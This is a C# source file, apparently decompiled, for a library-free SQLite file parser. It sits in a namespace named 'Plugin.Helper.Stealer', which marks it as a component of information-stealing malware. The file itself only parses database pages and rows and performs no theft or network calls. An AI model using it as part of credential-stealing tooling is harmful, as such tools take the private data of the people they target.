

using System;
using System.Collections.Generic;
using System.Text;
using System.Text.RegularExpressions;


namespace Plugin.Helper.Stealer
{
	public class SqlLite3Parser
	{
		private List<string> fieldNames = new List<string>();
		private List<SqlLite3Parser.TableEntry> tableEntries = new List<SqlLite3Parser.TableEntry>();
		private List<SqlLite3Parser.MasterTableInfo> MasterTableEntries = new List<SqlLite3Parser.MasterTableInfo>();
		private Encoding stringEncoding = Encoding.UTF8;
		private int pageSize = 65536;
		private int reservedEndPageSize;
		private byte[] DataBaseBytes;

		public SqlLite3Parser(byte[] db_bytes)
		{
			this.DataBaseBytes = !(this.stringEncoding.GetString(db_bytes, 0, 16) != "SQLite format 3\0") ? db_bytes : throw new Exception("Unsupported format");
			ushort num = this.ReadUShort(16);
			if (num != (ushort) 1)
				this.pageSize = (int) num;
			this.reservedEndPageSize = (int) this.ReadByte(20);
			switch (this.ReadInt(56))
			{
				case 2:
					this.stringEncoding = Encoding.Unicode;
					break;
				case 3:
					this.stringEncoding = Encoding.BigEndianUnicode;
					break;
			}
			this.ReadMasterTable(100);
		}

		public bool ReadTable(string tableName)
		{
			SqlLite3Parser.MasterTableInfo masterTableInfo = new SqlLite3Parser.MasterTableInfo();
			foreach (SqlLite3Parser.MasterTableInfo masterTableEntry in this.MasterTableEntries)
			{
				if (masterTableEntry.typename.ToLower() == "table" && masterTableEntry.name.ToLower() == tableName.ToLower())
				{
					masterTableInfo = masterTableEntry;
					break;
				}
			}
			if (masterTableInfo.sql_creation_command == null)
				return false;
			this.tableEntries.Clear();
			this.fieldNames.Clear();
			string[] columnNames = this.ExtractColumnNames(masterTableInfo.sql_creation_command);
			if (!this.ReadTableFromOffset((masterTableInfo.rootpage - 1) * this.pageSize))
				return false;
			this.fieldNames.AddRange((IEnumerable<string>) columnNames);
			return true;
		}

		public string[] GetTableNames()
		{
			List<string> stringList = new List<string>();
			foreach (SqlLite3Parser.MasterTableInfo masterTableEntry in this.MasterTableEntries)
			{
				if (masterTableEntry.typename.ToLower() == "table")
					stringList.Add(masterTableEntry.table_name);
			}
			return stringList.ToArray();
		}

		public int GetRowCount() => this.tableEntries.Count;

		public string GetTableSqlCommand(string tableName)
		{
			foreach (SqlLite3Parser.MasterTableInfo masterTableEntry in this.MasterTableEntries)
			{
				if (masterTableEntry.table_name.ToLower() == tableName.ToLower())
					return masterTableEntry.sql_creation_command;
			}
			return (string) null;
		}

		public object GetValue(int index, string value)
		{
			if (index > this.tableEntries.Count)
				throw new ArgumentOutOfRangeException(nameof (index));
			int index1 = this.fieldNames.IndexOf(value);
			if (index1 == -1)
				throw new Exception("could not find value");
			return value.ToLower() == "id" && this.tableEntries[index].values[index1] == null ? (object) this.tableEntries[index].rowId : this.tableEntries[index].values[index1];
		}

		public T GetValue<T>(int index, string value)
		{
			try
			{
				return (T) this.GetValue(index, value);
			}
			catch
			{
				return default (T);
			}
		}

		public void reset()
		{
			this.tableEntries.Clear();
			this.fieldNames.Clear();
			this.MasterTableEntries.Clear();
			this.ReadMasterTable(100);
		}

		private bool ReadTableFromOffset(int offset)
		{
			switch (this.DataBaseBytes[offset])
			{
				case 2:
					return false;
				case 5:
					return this.ParseInteriorTable(offset);
				case 10:
					return false;
				case 13:
					return this.ParseLeafTablePage(offset);
				default:
					return false;
			}
		}

		private bool ParseInteriorTable(int headerOffset)
		{
			int num1 = (int) this.ReadUShort(headerOffset + 3);
			int num2 = this.ReadInt(headerOffset + 8);
			int num3 = headerOffset + 12;
			for (int index = 0; index < num1; ++index)
			{
				int StartIndex = (int) this.ReadUShort(num3 + 2 * index);
				if (!this.ReadTableFromOffset(((headerOffset >= this.pageSize ? this.ReadInt(headerOffset + StartIndex) : this.ReadInt(StartIndex)) - 1) * this.pageSize))
					return false;
			}
			return this.ReadTableFromOffset((num2 - 1) * this.pageSize);
		}

		private bool ParseLeafTablePage(int headerOffset)
		{
			int length1 = (int) this.ReadUShort(headerOffset + 3);
			int num1 = headerOffset + 8;
			int[] numArray = new int[length1];
			for (int index = 0; index < length1; ++index)
				numArray[index] = (int) this.ReadUShort(num1 + 2 * index);
			for (int index1 = 0; index1 < numArray.Length; ++index1)
			{
				int offset1 = numArray[index1];
				if (headerOffset >= this.pageSize)
					offset1 += headerOffset;
				int bytesRead;
				this.ReadVarInt(offset1, out bytesRead);
				int offset2 = offset1 + bytesRead;
				int _rowId = (int) this.ReadVarInt(offset2, out bytesRead);
				int offset3 = offset2 + bytesRead;
				List<int> intList = new List<int>();
				long num2 = this.ReadVarInt(offset3, out bytesRead);
				int num3 = offset3 + bytesRead;
				for (long index2 = (long) num3 + num2 - (long) bytesRead; (long) num3 < index2; num3 += bytesRead)
					intList.Add((int) this.ReadVarInt(num3, out bytesRead));
				List<object> objectList = new List<object>();
				foreach (int num4 in intList)
				{
					object obj;
					switch (num4)
					{
						case 0:
							obj = (object) null;
							num3 = num3;
							break;
						case 1:
							obj = (object) this.ReadByte(num3);
							++num3;
							break;
						case 2:
							obj = (object) this.ReadShort(num3);
							num3 += 2;
							break;
						case 3:
							obj = (object) this.ReadX(num3, 3);
							num3 += 3;
							break;
						case 4:
							obj = (object) this.ReadInt(num3);
							num3 += 4;
							break;
						case 5:
							obj = (object) this.ReadX(num3, 6);
							num3 += 6;
							break;
						case 6:
							obj = (object) this.ReadLong(num3);
							num3 += 8;
							break;
						case 7:
							obj = (object) this.ReadDouble(num3);
							num3 += 8;
							break;
						case 8:
							obj = (object) 0;
							num3 = num3;
							break;
						case 9:
							obj = (object) 1;
							num3 = num3;
							break;
						default:
							if (num4 >= 12 && num4 % 2 == 0)
							{
								int length2 = (num4 - 12) / 2;
								byte[] destinationArray = new byte[length2];
								Array.Copy((Array) this.DataBaseBytes, num3, (Array) destinationArray, 0, length2);
								obj = (object) destinationArray;
								num3 += length2;
								break;
							}
							if (num4 >= 13 && num4 % 2 == 1)
							{
								int count = (num4 - 13) / 2;
								obj = (object) this.stringEncoding.GetString(this.DataBaseBytes, num3, count);
								num3 += count;
								break;
							}
							continue;
					}
					objectList.Add(obj);
				}
				this.tableEntries.Add(new SqlLite3Parser.TableEntry(_rowId, objectList.ToArray()));
			}
			return true;
		}

		private bool ReadMasterTable(int offset)
		{
			switch (this.DataBaseBytes[offset])
			{
				case 2:
					return false;
				case 5:
					return this.ParseMasterInteriorTable(offset);
				case 10:
					return false;
				case 13:
					return this.ParseMasterLeafTablePage(offset);
				default:
					return false;
			}
		}

		private bool ParseMasterInteriorTable(int headerOffset)
		{
			int num1 = (int) this.ReadUShort(headerOffset + 3);
			int num2 = this.ReadInt(headerOffset + 8);
			int num3 = headerOffset + 12;
			for (int index = 0; index < num1; ++index)
			{
				int StartIndex = (int) this.ReadUShort(num3 + 2 * index);
				if (!this.ReadMasterTable(((headerOffset >= this.pageSize ? this.ReadInt(headerOffset + StartIndex) : this.ReadInt(StartIndex)) - 1) * this.pageSize))
					return false;
			}
			return this.ReadMasterTable((num2 - 1) * this.pageSize);
		}

		private bool ParseMasterLeafTablePage(int headerOffset)
		{
			int length1 = (int) this.ReadUShort(headerOffset + 3);
			int num1 = headerOffset + 8;
			int[] numArray = new int[length1];
			for (int index = 0; index < length1; ++index)
				numArray[index] = (int) this.ReadUShort(num1 + 2 * index);
			for (int index1 = 0; index1 < numArray.Length; ++index1)
			{
				int offset1 = numArray[index1];
				if (headerOffset >= this.pageSize)
					offset1 += headerOffset;
				int bytesRead;
				this.ReadVarInt(offset1, out bytesRead);
				int offset2 = offset1 + bytesRead;
				int _rowId = (int) this.ReadVarInt(offset2, out bytesRead);
				int offset3 = offset2 + bytesRead;
				List<int> intList = new List<int>();
				long num2 = this.ReadVarInt(offset3, out bytesRead);
				int num3 = offset3 + bytesRead;
				for (long index2 = (long) num3 + num2 - (long) bytesRead; (long) num3 < index2; num3 += bytesRead)
					intList.Add((int) this.ReadVarInt(num3, out bytesRead));
				if (intList.Count == 5)
				{
					List<object> objectList = new List<object>();
					foreach (int num4 in intList)
					{
						object obj;
						switch (num4)
						{
							case 0:
								obj = (object) null;
								num3 = num3;
								break;
							case 1:
								obj = (object) this.ReadByte(num3);
								++num3;
								break;
							case 2:
								obj = (object) this.ReadShort(num3);
								num3 += 2;
								break;
							case 3:
								obj = (object) this.ReadX(num3, 3);
								num3 += 3;
								break;
							case 4:
								obj = (object) this.ReadInt(num3);
								num3 += 4;
								break;
							case 5:
								obj = (object) this.ReadX(num3, 6);
								num3 += 6;
								break;
							case 6:
								obj = (object) this.ReadLong(num3);
								num3 += 8;
								break;
							case 7:
								obj = (object) this.ReadDouble(num3);
								num3 += 8;
								break;
							case 8:
								obj = (object) 0;
								num3 = num3;
								break;
							case 9:
								obj = (object) 1;
								num3 = num3;
								break;
							default:
								if (num4 >= 12 && num4 % 2 == 0)
								{
									int length2 = (num4 - 12) / 2;
									byte[] destinationArray = new byte[length2];
									Array.Copy((Array) this.DataBaseBytes, num3, (Array) destinationArray, 0, length2);
									obj = (object) destinationArray;
									num3 += length2;
									break;
								}
								if (num4 >= 13 && num4 % 2 == 1)
								{
									int count = (num4 - 13) / 2;
									obj = (object) this.stringEncoding.GetString(this.DataBaseBytes, num3, count);
									num3 += count;
									break;
								}
								continue;
						}
						objectList.Add(obj);
					}
					if (!objectList.Contains((object) null) && objectList.Count == 5 && !(objectList[0].GetType() != typeof (string)) && !(objectList[1].GetType() != typeof (string)) && !(objectList[2].GetType() != typeof (string)) && (!(objectList[3].GetType() != typeof (int)) || !(objectList[3].GetType() != typeof (byte))) && !(objectList[4].GetType() != typeof (string)))
					{
						string _typename = (string) objectList[0];
						string _name = (string) objectList[1];
						string _table_name = (string) objectList[2];
						int _rootpage = objectList.GetType() == typeof (byte) ? (int) objectList[3] : (int) (byte) objectList[3];
						string _sql_creation_command = (string) objectList[4];
						this.MasterTableEntries.Add(new SqlLite3Parser.MasterTableInfo(_rowId, _typename, _name, _table_name, _rootpage, _sql_creation_command));
					}
				}
			}
			return true;
		}

		private string[] ExtractColumnNames(string createTableSql)
		{
			List<string> stringList = new List<string>();
			string str1 = Regex.Match(createTableSql, "\\((.*?)\\)", RegexOptions.Singleline).Groups[1].Value;
			char[] chArray = new char[1]{ ',' };
			foreach (string str2 in str1.Split(chArray))
			{
				string str3 = Regex.Match(str2.Trim(), "^\\s*(\\w+)").Groups[1].Value;
				stringList.Add(str3);
			}
			return stringList.ToArray();
		}

		private long ReadVarInt(int offset, out int bytesRead)
		{
			long num = 0;
			bytesRead = 0;
			for (int index = 0; index < 9; ++index)
			{
				byte dataBaseByte = this.DataBaseBytes[offset + index];
				num = num << 7 | (long) ((int) dataBaseByte & (int) sbyte.MaxValue);
				++bytesRead;
				if (((int) dataBaseByte & 128) == 0)
					break;
			}
			return num;
		}

		private ulong ReadX(int StartIndex, int size)
		{
			if (size > 8 || size == 0)
				return 0;
			ulong num1 = 0;
			int num2 = size - 1;
			for (int index = 0; index <= num2; ++index)
				num1 = num1 << 8 | (ulong) this.DataBaseBytes[StartIndex + index];
			return num1;
		}

		private ulong ReadULong(int StartIndex) => this.ReadX(StartIndex, 8);

		private long ReadLong(int StartIndex) => (long) this.ReadX(StartIndex, 8);

		private uint ReadUInt(int StartIndex) => (uint) this.ReadX(StartIndex, 4);

		private int ReadInt(int StartIndex) => (int) this.ReadX(StartIndex, 4);

		private ushort ReadUShort(int StartIndex) => (ushort) this.ReadX(StartIndex, 2);

		private short ReadShort(int StartIndex) => (short) this.ReadX(StartIndex, 2);

		private byte ReadByte(int StartIndex) => this.DataBaseBytes[StartIndex];

		private double ReadDouble(int Startindex)
		{
			return BitConverter.ToDouble(this.DataBaseBytes, Startindex);
		}

		private struct MasterTableInfo
		{
			public int rowId;
			public string typename;
			public string name;
			public string table_name;
			public int rootpage;
			public string sql_creation_command;

			public MasterTableInfo(
				int _rowId,
				string _typename,
				string _name,
				string _table_name,
				int _rootpage,
				string _sql_creation_command)
			{
				this.rowId = _rowId;
				this.typename = _typename;
				this.name = _name;
				this.table_name = _table_name;
				this.rootpage = _rootpage;
				this.sql_creation_command = _sql_creation_command;
			}
		}

		private struct TableEntry
		{
			public int rowId;
			public object[] values;

			public TableEntry(int _rowId, object[] _values)
			{
				this.rowId = _rowId;
				this.values = _values;
			}
		}
	}
}
